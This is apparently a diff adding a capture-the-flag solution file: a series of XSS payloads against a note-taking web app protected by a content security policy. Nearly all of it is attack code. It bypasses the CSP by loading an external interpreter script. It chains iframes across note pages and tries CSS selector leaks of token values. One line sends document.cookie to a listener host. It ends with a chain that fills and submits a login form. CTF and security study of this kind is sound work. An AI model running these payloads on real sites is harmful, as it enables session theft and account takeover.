@@ -1,0 +1,117 @@
+<!-- Simple alert(1) -->
+<iframe srcdoc="<br csp='alert(1)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- main.js -->
+<iframe id="1" srcdoc="<br id='form'; csp='console.log(&quot;main.js&quot;)'><div id='noteList'></div><script src='/static/main.js'></script><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- Call other note iframe -->
+<iframe srcdoc="<br csp='alert(456)'><iframe src='/note?id=57db0219-7f7d-442a-a27a-da268bc44cc0'></iframe><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- iframe chain -->
+<iframe srcdoc="<br csp='alert(5)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+<iframe srcdoc="<br csp='alert(4)'><iframe src='/note?id=e36ce212-1852-4c83-b976-4d1e428d144f'></iframe><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+<iframe srcdoc="<br csp='alert(3)'><iframe src='/note?id=5cd9670e-d149-4475-b49e-98120a4e5137'></iframe><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+<iframe srcdoc="<br csp='alert(2)'><iframe src='/note?id=6d19ea95-22a3-4164-b592-52ecb7f399d7'></iframe><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+<iframe srcdoc="<br csp='alert(1)'><iframe src='/note?id=44fa94a3-14d3-4324-9784-0240c675518a'></iframe><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- Specific name -->
+<iframe srcdoc="<br csp='console.log(parent.parent.document.getElementsByName(&quot;note_id&quot;))'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- With main.js -->
+<iframe srcdoc="<div id='noteList'></div><br id='form'><script src='/static/main.js'></script><br csp='document.querySelector(&quot;.note&quot;).onclick()'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+
+<!-- Inline style to use url("url") -->
+<div style="background: url('http://localhost:10082');">hello</div>
+
+<style>input[name=token][value^="1"] { background: url("http://example.com/1"); }</style>
+<style>input[name=token][value^="8"] { background: url("http://example.com/8"); }</style>
+
+<iframe srcdoc="<style>input[name=&quot;note_id&quot;][value^=&quot;1&quot;] { background: url(&quot;http://example.com/1&quot;); }</style><iframe src='/note?id=e36ce212-1852-4c83-b976-4d1e428d144f'></iframe>"></iframe>
+<iframe srcdoc="<style>input[name=&quot;note_id&quot;][value^=&quot;8&quot;] { background: url(&quot;http://example.com/8&quot;); }</style><iframe src='/note?id=8915320d-6e28-4807-b7a9-084f95cf84a5'></iframe>"></iframe>
+
+<iframe srcdoc="<style>input[name=&quot;note_id&quot;][value^=&quot;1&quot;] { background: url(&quot;http://example.com/1&quot;); }</style><input name=&quot;note_id&quot; value=&quot;123456&quot;>"></iframe>
+
+<iframe srcdoc="<br csp='window.location = &quot;http://localhost:10082?q=&quot; + document.cookie'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+
+<!-- MAIN -->
+<iframe id="1" srcdoc="<br id='form'; csp='console.log(&quot;main.js&quot;)'><div id='noteList'></div><script src='/static/main.js'></script><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- onclick() -->
+<!-- <iframe id="2" srcdoc="<br csp='document.getElementById(1).contentDocument.getElementsByClassName(&quot;note&quot;)[0].onclick()'><iframe src='/note?id=d87ada96-9ce9-4706-b7cb-e32997c1c641&author=aaaaa'></iframe><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe> -->
+<!-- <iframe id="2" srcdoc="<br csp='document.querySelector(1).contentDocument.querySelector(&quot;.note&quot;).onclick()'><iframe src='/note?id=d87ada96-9ce9-4706-b7cb-e32997c1c641&author=aaaaa'></iframe><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe> -->
+
+<iframe id="2" srcdoc="<iframe id='1' src='/'></iframe><br csp='document.getElementById(1).contentDocument.querySelector(&quot;.note&quot;).onclick()'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- Provide CSP Bypass -->
+<iframe id="3" srcdoc="<br csp='console.log(&quot;csp-bypass&quot;)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+
+
+
+<!-- Finally work! -->
+
+<!-- Click Parent (Window 2) -->
+<!-- <iframe srcdoc="<br csp='parent.parent.document.getElementById(1).contentDocument.querySelector(&quot;.note&quot;).onclick()'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe> -->
+<iframe srcdoc="<br csp='var i=parent.parent.document.getElementById(1).contentDocument; i.querySelector(&quot;.note&quot;).onclick(); console.log(i.location)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- Leak Content (Window 3) -->
+<iframe srcdoc="<br csp='console.log(parent.parent.document.getElementById(1).contentDocument.location)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- Main Window -->
+<!-- Contains homepage (Window 1), Window 2, and Window 3 -->
+<iframe srcdoc="<iframe id='1' src='/'></iframe><iframe src='/note?id=897905bf-d2cb-45a5-ab6d-8af8dc5d67d5&author=aaaaa'></iframe><iframe src='/note?id=c268e767-fe3f-4253-96bf-fbff8ce9dfbe&author=aaaaa'></iframe>"></iframe>
+
+<iframe srcdoc="<iframe id='1' src='/'></iframe><iframe src='/note?id=11bf2bf6-e4ee-4ceb-8352-af297e5fd875&author=aaaaa'></iframe><iframe src='/note?id=c268e767-fe3f-4253-96bf-fbff8ce9dfbe&author=aaaaa'></iframe>"></iframe>
+
+<!-- Register an account -->
+<!-- <iframe srcdoc="<br csp='fetch(&quot;/login&quot;,{method:&quot;POST&quot;,body:`username=ttttt&password=yyyyy`,headers:{&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;}})'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe> -->
+
+<iframe srcdoc="<br csp='document.querySelector(&quot;#login-form&quot;).username.value = &quot;admin&quot;'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<iframe name="a" srcdoc="<iframe name='b' src='/'></iframe><iframe src='/note?id=11bf2bf6-e4ee-4ceb-8352-af297e5fd875&author=aaaaa'></iframe><iframe src='/note?id=c268e767-fe3f-4253-96bf-fbff8ce9dfbe&author=aaaaa'></iframe>"></iframe>
+
+
+
+<!-- ROOT -->
+<!-- a: ROOT
+        b: '/'
+        c: '/login'
+        d: 'NOTE 0' -->
+<iframe name="a" srcdoc="<iframe name='b' src='/'></iframe><iframe name='c' src='/login'></iframe><iframe name='d' src='/note?id=0b5dbe88-4b8b-42e4-858b-1434466b9f11&author=aaaaa'></iframe>"></iframe>
+
+<!-- g1 -->
+<!-- setTimeout(()=>top.a.b.noteList.children[0].click(),0); -->
+<!-- /note?id=65655578-120e-49ae-abc9-10625db93672 -->
+<iframe srcdoc="<br csp='setTimeout(()=>top.a.b.noteList.children[0].click(),0)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- g2 -->
+<!-- setTimeout(()=>top.a.c["login-form"].username.value=`5nonce${top.a.b.note.children[2].textContent[5]}`,1000); -->
+<!-- /note?id=acfe7131-717b-4f8f-a141-caebe3b5c7a4 -->
+<iframe srcdoc="<br csp='setTimeout(()=>top.a.c[&quot;login-form&quot;].username.value=`5nonce${top.a.b.note.children[2].textContent[5]}`,1000)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- g3 -->
+<!-- setTimeout(()=>top.a.c["login-form"].password.value=`5nonce${top.a.b.note.children[2].textContent[5]}`,1000); -->
+<!-- /note?id=3cd94b5b-fd59-4085-aab1-ea67b6e001ac -->
+<iframe srcdoc="<br csp='setTimeout(()=>top.a.c[&quot;login-form&quot;].password.value=`5nonce${top.a.b.note.children[2].textContent[5]}`,1000)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- g4 -->
+<!-- setTimeout(()=>top.a.c["login-form"].submit(),2000); -->
+<!-- /note?id=95db2360-d9fa-49ce-b66b-7f586e1099c5 -->
+<iframe srcdoc="<br csp='setTimeout(()=>top.a.c[&quot;login-form&quot;].submit(),2000)'><script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>
+
+<!-- NOTE 0 -->
+<!-- /note?id=0b5dbe88-4b8b-42e4-858b-1434466b9f11 -->
+<!-- g1, NOTE 1 -->
+<iframe srcdoc="<iframe src='/note?id=65655578-120e-49ae-abc9-10625db93672&author=aaaaa'></iframe><iframe src='/note?id=f4b7b0c6-e09b-4efe-bf0e-9e58a2b03fa1&author=aaaaa'></iframe>"></iframe>
+
+<!-- NOTE 1 -->
+<!-- /note?id=f4b7b0c6-e09b-4efe-bf0e-9e58a2b03fa1 -->
+<!-- g2, NOTE 2 -->
+<iframe srcdoc="<iframe src='/note?id=acfe7131-717b-4f8f-a141-caebe3b5c7a4&author=aaaaa'></iframe><iframe src='/note?id=b999de79-6298-4109-baa1-a2e5d79fea9c&author=aaaaa'></iframe>"></iframe>
+
+<!-- NOTE 2 -->
+<!-- /note?id=b999de79-6298-4109-baa1-a2e5d79fea9c -->
+<!-- g3, g4 -->
+<iframe srcdoc="<iframe src='/note?id=3cd94b5b-fd59-4085-aab1-ea67b6e001ac&author=aaaaa'></iframe><iframe src='/note?id=95db2360-d9fa-49ce-b66b-7f586e1099c5&author=aaaaa'></iframe>"></iframe>
